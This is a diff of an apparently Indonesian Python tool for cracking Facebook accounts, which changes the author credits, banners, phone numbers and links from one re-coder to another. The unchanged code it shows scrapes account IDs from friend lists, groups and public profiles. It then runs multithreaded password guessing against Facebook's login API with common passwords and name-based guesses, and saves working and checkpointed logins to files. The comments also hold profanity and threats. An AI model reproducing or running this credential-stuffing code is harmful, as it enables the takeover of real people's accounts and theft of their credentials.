@@ -2,21 +2,21 @@
 # -*- coding: utf-8 
 # hanya recode :v
 #jangan di jual kontol awas aja niat jahat hasil nya busuk
-#fb = Mbokey
+#fb = Ndra69
 
 #JANGAN DI RECODE YA BABI
 
 #Lo Recode Kontol lo gue sumpahin pecah Mati Lo Gk selamat kecuali lo minta izin ke gue !!
 
-#Nomor Whatsapp gue +62 812-8390-9651
+#Nomor Whatsapp gue +62 852-5677-4185
 
-#~═║DI RECODE║~═
+#~═║SCRIPT ASTA.V2║=~#
 
-#~═║1-23-2022║~═
+#~═║Minggu - 8 Januari - 2023║=~#
 
-#UPDATE~═║05-23-2022║~═BY~═║ MBOKEY TANVAN X IYE LUU TAMVAN║~═
+#UPDATE~═║NOT UPDATE║~═V2~═║ CODEX BY NDREX SAGE║~═
 
-#NDREX KANG RECODE ║ MINTA IZIN YE :V ║
+#facebook/NDREX.KING.OF.THE.TAUHID║ USER 404 NOT FOUND ;v ║
 
 #_CRACKER_~═║COKIEE║~═YANG~═LEZAT~═║
 
@@ -35,21 +35,22 @@ def aink(s):
         time.sleep(1./300)
 
 time.sleep(0.1)
-print("""\033[95m╔═════════════════════════════════════════════╗
-\033[95m║ \033[97m *\033[96mAuthor   \033[97m║\033[97mMBOKEYY     \033[95m                   ║
-\033[95m║ \033[97m *\033[96mPerecode \033[97m║\033[97mNDREX STORE \033[95m                   ║
-\033[95m║ \033[97m *\033[96mFACEBOOK \033[97m║\033[97mhttps://facebook.com/MBOKEYY.\033[95m  ║
-\033[95m║ \033[97m *\033[96mINSTAGRAM\033[97m║ \033[97m     FACHRIKANOHYEEE .REE...\033[95m  ║
-\033[95m╚═════════════════════════════════════════════╝""")
-print("\033[95m║ \033[97m-\033[96mM\033[97m-\033[96mB\033[97m-\033[96mO\033[97m-\033[96mK\033[97m-\033[96mE\033[97m-\033[96mY \033[97m-\033[96m B\033[97m-\033[96mH\033[97m-\033[96mI\033[97m-\033[96mZ\033[97m-\033[96mE\033[97m-\033[96mR \033[97m- \033[96mR\033[95m║")
+print("""
+\033[96m    _________   ________________  ____  ____  __ __
+\033[96m   / ____/   | / ____/ ____/ __ )/ __ \/ __ \/ //_/
+\033[96m  / /_  / /| |/ /   / __/ / __  / / / / / / / ,<
+\033[96m / __/ / ___ / /___/ /___/ /_/ / /_/ / /_/ / /| |
+\033[96m/_/   /_/  |_\____/_____/_____/\____/\____/_/ |_|
+""")
+print("\033[95m[\033[97m+\033[95m]\033[97m-\033[96mN\033[97m-\033[96mD\033[97m-\033[96mR\033[97m-\033[96mE\033[97m-\033[96mX\033[97m-\033[95m[\033[97m+\033[95m]")
 print("\033[92m*Bila Belum Mengetahui Pasword Chat Di Whatsapp")
-print("\033[92m*Whatsapp Saya:+62 812-8390-9651")
-print("\033[92m*Klo WhatsApp Admin Script Offline, Bisa Minta Password Di Gw!") 
-print("\033[92m*WhatSapp Gw:+6285696374074")
+print("\033[92m*Whatsapp Saya:+62 852-5677-4185")
+print("\033[92m*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*") 
+print("\033[92mChet Gw Ye Kontol Jangan Maen Nyolong Aje")
 
 
 input("\n\033[95m[\033[97m?\033[95m] \033[96mNama Anda\033[97m:\033[92m ")
-Password = "H҉A҉C҉K҉E҉R҉"
+Password = "NDREX"
 
 loop = 'true'
 while (loop == 'true'):
@@ -60,7 +61,7 @@ while (loop == 'true'):
             exit("Pasword salah")
 
 def fail():
-        a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}).json()
+        a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13"}).json()
         try:
             ip = a["query"]
         except KeyError:
@@ -94,36 +95,35 @@ def fail():
 def peak():
     time.sleep(0.1)
     print("""
- \033[95m╔═════════════════════════════════════════════════
-\033[95m ║•\033[96m ® ⋆ \033[97m🄱 \033[96m🄷 \033[97m🄰 \033[96m🄽 \033[97m🄶 \033[96m🅂 \033[97m🄰 \033[96m🅃 \033[97m✥ \033[96m🄵\033[97m 🄰 \033[96m🄲 \033[97m🄴\033[96m 🄱 \033[97m🄾 \033[96m🄾 \033[97m🄺 \033[96m⋆ ®
- \033[95m║\033[96m•Teman Aing\033[97m:\033[97mNdrii Tzy END Faiz Tzy END Ndrex Tzy
-\033[95m ║═════════════════════════════════════════════════
-\033[95m ║\033[97m•\033[96mTahun perecode \033[97m= 2022-SABTU-23-APRIL
-\033[95m ║═════════════════════════════════════════════════
- \033[95m║\033[95m[\033[92m+\033[95m]\033[96mxAuthor  \033[97m: \033[97mMBOKEYY BHIZER
- \033[95m║\033[95m[\033[92m+\033[95m]\033[96mxPerecode \033[97m: \033[97m NDREX STORE
-\033[95m ║\033[95m[\033[92m+\033[95m]\033[96mInstagram\033[97m: \033[91mFACHRIKANOHYEE REE..
- \033[95m║\033[95m[\033[92m+\033[95m]\033[96mFacebook \033[97m: \033[97mfacebook.com/Mbokey
- \033[95m║═════════════════════════════════════════════════ """)
-
+\033[96m\033[96m\033[96m\033[96m ░█████╗░░██████╗████████╗░█████╗░
+\033[96m\033[96m\033[96m\033[96m ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗
+\033[96m\033[96m\033[96m\033[96m ███████║╚█████╗░░░░██║░░░███████║
+\033[96m\033[96m\033[96m\033[96m ██╔══██║░╚═══██╗░░░██║░░░██╔══██║
+\033[96m\033[96m\033[96m\033[96m ██║░░██║██████╔╝░░░██║░░░██║░░██║
+\033[96m\033[96m\033[96m\033[96m ╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝
+\033[97m\033[97m\033[97m\033[97m          𝙰𝚂𝚃𝙰 𝚅𝙴𝚁𝚂𝙸𝙾𝙽\033[91m :\033[96m 2\033[96m\033[96m
+\033[93m\033[93m\033[96m\033[96m\033[96m\033[96m\033[96m\033[96m\033[96m\033[96m
+""")
 def mbfv2():
     time.sleep(0.1)
+    print(" \x1b[95m╔═════════════════════════════════════════════════╗") 
+    print(" \033[95m║═> \033[97m[\033[91m•\033[97m] \033[97mKETIK NOMOR 1 UNTUK MULAI PROSES CREK 👉\033[96m-=\033[95m║")                                              
     print(" \x1b[95m║═╔═══════════════════════════════════════════════╗")
-    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m1\033[97m.\033[96mMÂŠÛĶ                               \033[96m~═\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m1\033[97m.\033[96mMASUK                               \033[96m~═\033[95m║")
     print(" \033[95m║═╔═════════════════════════════════════════════~═║")
-    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m2\033[97m.\033[96mČÂŘÂ MÊŇĎÂPÂŤĶÂŇ ČÔĶÎÊ              \033[96m~═\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m2\033[97m.\033[96mCARA MENDAPATKAN COKIE              \033[96m~═\033[95m║")
     print(" \033[95m║═╔═════════════════════════════════════════════~═║")
-    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m3\033[97m.\033[96mMÂŠÛĶ ĞŘÛP FB《COMUNITY》OF THE HACKER\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m3\033[97m.\033[96mFLLWW AKUN FB《COMUNITY》GW YAA KENTD \033[95m║")
     print(" \033[95m║═╔═════════════════════════════════════════════~═║")
-    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m4\033[97m.\033[96mMÂŠÛĶ ĞŘÛP WHÂŤŠÂPP                 \033[96m~═\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m4\033[97m.\033[96mMASUK GRUP WHATSAPP                 \033[96m~═\033[95m║")
     print(" \033[95m║═╔═════════════════════════════════════════════~═║")
-    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m5\033[97m.\033[96mÛPĞŘÂĎÊ ŠÊŘVÊŘ                      \033[96m~═\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m?\033[95m] \033[97m0\033[96m5\033[97m.\033[96mUPGRADE SERVER                      \033[96m~═\033[95m║")
     print(" \033[95m║═╔═════════════════════════════════════════════~═║")
-    print(" \033[95m║═╚═>[\033[97m!\033[95m] \033[91m00\033[96m.\033[91mĶÊŁÛÂŘ                              \033[96m~═\033[95m║")
+    print(" \033[95m║═╚═>[\033[97m!\033[95m] \033[91m00\033[96m.\033[91mKELUAR                              \033[96m~═\033[95m║")
     print(" \x1b[95m╚═════════════════════════════════════════════════╝")
     time.sleep(0.1)
 
-    print("\033[95m╭╼[\033[96mMBOKEYY\033[95m]\033[95m─\033[95m[\033[96m09-12-2021\033[95m]")
+    print("\033[95m╭╼[\033[96mNDREX\033[95m]\033[95m─\033[95m[\033[96m11-01-2023\033[95m]")
     print ("\033[95m~")
     uwu=input("\033[95m╰╼▪\033[96m>   \033[90m")
     if uwu == "1" or uwu =="01":
@@ -184,8 +184,8 @@ def mbfv2():
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://b-api.facebook.com/method/auth.login'
-             response = requests.get(api, params=params)
+             bapi = 'https://b-api.facebook.com/method/auth.login'
+             response = requests.get(bapi, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * \033[90m[\033[92mLive\033[90m]👉\033[92m {username}[-]{password}                       ",end="")
                  print()
@@ -196,7 +196,7 @@ def mbfv2():
                         with open('now.txt','a') as f:
                                 f.write(username + '[-]' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * \033[90m[\033[93mMbokey\033[90m]👉\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
+                   print(f"\r\033[1;93m  * \033[90m[\033[93mNdrex\033[90m]👎\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -207,7 +207,7 @@ def mbfv2():
              else:
                    die += 1
              for i in list('+×'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mMbokey \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mLive \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mNdrex \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mLive \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -275,7 +275,8 @@ def mbfv2():
                    lupo_lupo_milzu()
                    fail()
                    peak()
-                   aink(" \033[95m║═*\033[96mPILIH METODE CRACK")
+                   aink(" \033[95m╔═════════════════════════════════════════════════╗") 
+                   aink(" \033[95m║═>\033[96m😄PILIH METODE CREKK UNTUK NGE HEK AKUN AMPAS\033[95m<=║")
                    aink(" \x1b[95m║═╔═══════════════════════════════════════════════╗")
                    aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m01\033[97m.\033[96mCRECK DAFTAR TEMAN                  \033[95m~═║")
                    aink(" \033[95m║═╔═════════════════════════════════════════════\033[95m~═║")
@@ -285,26 +286,26 @@ def mbfv2():
                    aink(" \033[95m║═╔═════════════════════════════════════════════\033[95m~═║")
                    aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m04\033[97m.\033[96mCRECK DARI GRUP                     \033[95m~═║")
                    aink(" \033[95m║═╔═════════════════════════════════════════════\033[95m~═║")
-                   aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m05\033[97m.\033[96mCRECK DARI PUBLIK                   \033[95m~═║")
+                   aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m05\033[97m.\033[96mCRECK DARI PUBLIC                   \033[95m~═║")
                    aink(" \033[95m║═╔═════════════════════════════════════════════\033[95m~═║")
                    aink(" \033[95m║═╚═>[\033[96m!\033[95m] \033[96m06\033[97m.\033[96mLIHAT HASIL CRECK                   \033[95m~═║")
                    aink(" \x1b[95m║═╔═════════════════════════════════════════════\033[95m~═║")
-                   aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m07\033[97m.\033[96mHAPUS COKIES YANG LEZAT            \033[95m~═║")
+                   aink(" \033[95m║═╚═>[\033[96m?\033[95m] \033[96m07\033[97m.\033[96mHAPUS COKIES YANG LEZAT            \033[95m ~═║")
                    aink(" \033[95m║═╔═════════════════════════════════════════════\033[95m~═║")
                    aink(" \033[95m║═╚═>[\033[91m?\033[95m] \033[91m00\033[97m.\033[96mKELUAR                              \033[95m~═║")
                    aink(" \033[95m╚═════════════════════════════════════════════════╝")
-                   print("\033[95m╭╼[\033[96mMBOKEY\033[95m]─[\033[96m09-12-2021\033[95m]")
+                   print("\033[95m╭╼[\033[96mNDREX\033[95m]─[\033[96m11-01-2023\033[95m]")
                    print ("\033[95m~")
                    doge=input("\033[95m╰╼▪>   \033[92m")
                    if doge =="":
                          print("\n\n\033[95m [\033[91m!\033[95m] \033[96mHarus dipilih!")
                          uwutc()
                    elif doge == '0' or doge =='00':
-                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu folow facebook Mbokey...\n\n")
-                         os.system('xdgu-open  https://www.facebook.com/alfahri.anansyahsaputra.7')
+                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu folow facebook Ndrex...\n\n")
+                         os.system('xdgu-open https://www.facebook.com/NDREX.KING.OF.THE.TAUHID')
                          exit()                   	
                    elif doge == '7' or doge =='07':
-                         print("\n\x1b[1;95m [\x1b[1;96m*\x1b[1;95m] \x1b[1;96mHarap bersabar... ")
+                         print("\n\x1b[1;95m [\x1b[1;96m*\x1b[1;95m] \x1b[1;96mHarap bersabar Ini Ujian...! ")
                          aink("\x1b[1;91m ▪ 10")
                          aink("\x1b[1;91m ▪▪ 20")
                          aink("\x1b[1;91m ▪▪▪ 30")
@@ -384,14 +385,15 @@ def mbfv2():
                    peak()
                    print('\033[95m\033[92mJUMLAH ID FB\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m \n",end="")       
                    expass = input("\n\033[1;93m [\033[1;96m?\033[1;93m] + Password1 \033[1;91m: \033[1;92m")
-                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password2 \033[1;91m: \033[1;92m")
+                   expass = input("\033[1;92m [\033[1;93m?\033[1;92m] + Password2 \033[1;91m: \033[1;92m")
                    aink('\x1b[1;95m────────────────────────────────────────────────────\n')
                    lupo_lupo_milzu()
                    fail()
-                   peak()
+                   peak()                  
                    print('\033[96mSemua ID\x1b[1;91m :\033[96m ' + str(len(id)) + "\n\033[92m \n",end="")
-                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Mbokey\033[92m disimpan di \033[91m: \033[92mcp.txt')
-                   print('\n [\x1b[1;91m▪\x1b[1;95m] \033[92mMatikan data seluler untuk menjeda proses crack\n')
+                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Ndrex\033[92m disimpan di \033[91m: \033[92mcp.txt')
+                   print('\n [\x1b[1;91m▪\x1b[1;92m] \033[92mMainkan Mode Pesawat 5 Detik Untuk Menjeda Proces Crek\n')
+                   print('\n [\x1b[1;97m▪\x1b[1;92m]\033[96m SEMOGA KAMU HOKY\033[97m...\033[96m! \n') 
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
@@ -406,7 +408,7 @@ def mbfv2():
                                                      str(x) + '123456',
                                                           'sayang',
                                                            'kontol',
-                                                           'anjing',
+                                                           'anjing', 
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
@@ -426,7 +428,7 @@ def mbfv2():
          os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
          mbfv2()
     elif uwu == "3" or uwu =="03":
-         os.system('xdg-open https://www.facebook.com/groups/338110617616908')
+         os.system('xdg-open https://www.facebook.com/NDREX.KING.OF.THE.TAUHID')
          mbfv2()
     elif uwu == "4" or uwu =="04":
          os.system('xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2')
@@ -439,7 +441,7 @@ def mbfv2():
          mbfv2()
     elif uwu == "0" or uwu =="00":
          aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n  Dan jangan lupa follow facebook saya\n\n")
-         os.system("xdg-open https://www.facebook.com/alfahri.anansyahsaputra.7")
+         os.system("xdg-open https://www.facebook.com/NDREX.KING.OF.THE.TAUHID")
          aink("\033[93m [▪] BYE...")
          exit()
 
@@ -450,4 +452,3 @@ if __name__=="__main__":
      fail()
      peak()
      mbfv2()
-
